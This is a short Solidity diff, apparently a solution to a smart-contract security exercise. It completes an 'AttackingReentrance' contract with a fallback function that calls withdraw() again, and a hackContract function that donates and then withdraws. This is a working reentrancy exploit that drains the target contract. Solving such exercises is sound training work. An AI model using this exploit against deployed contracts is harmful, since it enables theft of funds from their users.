@@ -9,7 +9,14 @@ contract AttackingReentrance {
         contractAddress = _contractAddress;
     }
 
+    fallback() external payable {
+        Reentrance r = Reentrance(contractAddress);
+        r.withdraw();
+    }
+
     function hackContract() external {
-        // Code me!
+        Reentrance r = Reentrance(contractAddress);
+        r.donate{value: address(this).balance}(address(this));
+        r.withdraw();
     }
 }
